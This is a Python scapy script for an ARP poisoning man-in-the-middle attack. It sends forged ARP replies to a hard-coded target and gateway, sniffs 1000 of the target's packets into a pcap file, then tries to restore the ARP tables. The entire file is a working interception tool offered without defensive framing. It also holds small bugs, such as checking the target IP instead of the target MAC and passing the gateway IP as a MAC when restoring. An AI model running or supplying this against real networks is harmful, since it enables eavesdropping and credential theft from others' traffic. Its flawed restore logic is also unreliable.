# -*- coding: utf-8 -*-
from scapy.all import *
import os
import sys
import threading
import  signal
 
interface = 'ens33'
target_ip = '192.168.85.133'
gateway_ip = '192.168.85.2'
packet_count = 1000
 
def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
	print("[*] restoring target......")
	send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
	send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
	
	os.kill(os.getpid(),signal.SIGINT)
 
def get_mac(ip_address):
	responses,unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address),timeout=2,retry=10)
	for s,r in responses:
		return(r[Ether].src)
	return None
 
def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
	poison_target = ARP()
	poison_target.op = 2
	poison_target.psrc = gateway_ip
	poison_target.pdst = target_ip
	poison_target.hwdst = target_mac
	
	poison_gateway = ARP()
	poison_gateway.op = 2
	poison_gateway.psrc = target_ip
	poison_gateway.pdst = gateway_ip
	poison_gateway.hwdst = gateway_mac
	
	print("[*] Begining the ARP poison. [CTRL-C to stop]")
	
	while True:
		try:
			send(poison_target)
			send(poison_gateway)
			time.sleep(2)
		except KeyboardInterrupt:
			restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
		
	print("[*] ARP poison attack finished.")
	return
 
#determine the network card
conf.iface = interface
 
#shutdown the output
conf.verb = 0
 
gateway_mac = get_mac(gateway_ip)
 
if gateway_mac is None:
	print("[!!!] Failed to get gateway MAC. Exit!")
	sys.exit(0)
else:
	print("[*] gateway %s is at %s" %(gateway_ip,gateway_mac))
 
target_mac = get_mac(target_ip)
 
if target_ip is None:
	print("[!!!] Failed to get the target MAC. Exit!")
	sys.exit(0)
 
#start a threading for arp poison
poison_thread = threading.Thread(target = poison_target,args = (gateway_ip,gateway_mac,target_ip,target_mac))
poison_thread.start()
 
try:
	print("[*] Starting sniffer for %d packets" % packet_count)
	bpf_filter = "ip host %s" % target_ip
	packets = sniff(count = packet_count,filter = bpf_filter)
	wrpcap('arper.pcap',packets)
	
	restore_target(gateway_ip,gateway_ip,target_ip,target_mac)
 
except:
	restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
	sys.exit(0)
